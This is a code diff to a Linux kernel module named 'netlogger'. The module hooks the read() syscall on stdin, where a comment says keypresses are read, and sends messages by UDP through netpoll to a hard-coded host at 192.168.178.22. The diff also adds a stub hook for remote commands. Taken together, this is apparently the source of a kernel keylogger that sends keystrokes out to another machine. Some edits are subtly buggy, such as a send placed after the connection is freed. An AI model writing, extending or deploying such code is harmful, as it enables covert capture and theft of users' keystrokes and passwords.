@@ -16,6 +16,31 @@
 int pos;
 struct netpoll *np;
 
+static void netlogger_send(int pid, char *buf, unsigned int len)
+{
+	char *msg = NULL;
+	int msg_size = 0;
+
+	if (!np)
+		return;
+
+
+	msg_size = strlen(LOG_PREF) + len + MAX_PID_CHARS;
+	msg = kzalloc(msg_size, GFP_KERNEL);
+	if (!msg)
+		return;
+
+	msg_size = snprintf(msg, msg_size, LOG_PREF, pid, buf);
+
+	if (msg_size <= 0) {
+		printk(KERN_INFO "Something went wrong\n");
+		return;
+	}
+
+	netpoll_send_udp(np, msg, msg_size);
+	kfree(msg);
+}
+
 static void netlogger_init(void)
 {
 	char target_config[] = "6665@0.0.0.0/eth0,6666@192.168.178.22/ff:ff:ff:ff:ff:ff";
@@ -38,6 +63,7 @@ static void netlogger_init(void)
 	if (netpoll_setup(np))
 		goto fail;
 
+	netlogger_send(-1, "netlogger started", 17);
 	return;
 
 fail:
@@ -53,33 +79,10 @@ static void netlogger_exit(void)
 	netpoll_cleanup(np);
 	kfree(np);
 	np = NULL;
+	netlogger_send(-1, "netlogger exiting", 17);
 }
 
-static void netlogger_send(int pid, char *buf, unsigned int len)
-{
-	char *msg = NULL;
-	int msg_size = 0;
-
-	if (!np)
-		return;
-
-	msg_size = strlen(LOG_PREF) + len + MAX_PID_CHARS;
-	msg = kzalloc(msg_size, GFP_KERNEL);
-	if (!msg)
-		return;
-
-	msg_size = snprintf(msg, msg_size, LOG_PREF, pid, buf);
-
-	if (msg_size <= 0) {
-		printk(KERN_INFO "Something went wrong\n");
-		return;
-	}
-
-	netpoll_send_udp(np, msg, msg_size);
-	kfree(msg);
-}
-
-asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t count, long ret)
+asmlinkage long netlogger_read_syscall(unsigned int fd, char __user *buf, size_t count, long ret)
 {
 	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
 	if (fd != 0)
@@ -89,16 +92,23 @@ asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t co
 	return ret;
 }
 
+void netlogger_command(char *cmd)
+{
+	/* Command logic goes here */
+	
+	printk(KERN_INFO MSG_PREF(MOD_NAME)"received %s\n", cmd);
+}
+
 /* Initialization function which is called when the module is
    insmoded into the kernel. It replaces the read() syscall. */
 void interceptor_init(struct orig *original_syscalls)
 {
 	netlogger_init();
-	netlogger_send(-1, "netlogger started", 17);
 
-	register_read_instrumenter(my_read_syscall_ref);
+	register_read_instrumenter(netlogger_read_syscall);
+	register_command_parser(netlogger_command);
 
-	printk(KERN_INFO MSG_PREF(MOD_NAME)"Loaded.\n");
+	printk(KERN_INFO MSG_PREF(MOD_NAME)"loaded.\n");
 }
 
 /* Cleanup function which is called just before module
@@ -106,9 +116,9 @@ void interceptor_init(struct orig *original_syscalls)
 
 void interceptor_exit(void)
 {
-	deregister_read_instrumenter(my_read_syscall_ref);
+	deregister_command_parser(netlogger_command);
+	deregister_read_instrumenter(netlogger_read_syscall);
 
-	netlogger_send(-1, "netlogger exiting", 17);
 	netlogger_exit();
 
 	printk(KERN_INFO MSG_PREF(MOD_NAME)"unloaded\n");
